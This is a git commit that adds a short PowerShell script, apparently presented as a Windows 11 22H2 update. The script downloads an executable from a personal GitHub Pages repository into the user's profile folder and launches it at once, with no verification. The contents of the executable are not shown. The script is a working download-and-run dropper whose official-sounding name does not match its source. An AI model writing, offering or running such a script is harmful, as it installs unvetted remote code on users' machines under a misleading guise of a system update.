dbcbb57432722379f7df2c82815f645f3674d9f9
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-08 23:28:26 +0300

    Create Windows1122H2version0.0.1.ps1

---
+++ Windows1122H2/Windows1122H2version0.0.1.ps1
@@ -0,0 +1,8 @@
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Windows1122H2/Windows1122H2.exe"
+$destination = "$env:USERPROFILE\Windows1122H2.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+Start-Sleep -Seconds 1
+
+Start-Process -FilePath $destination
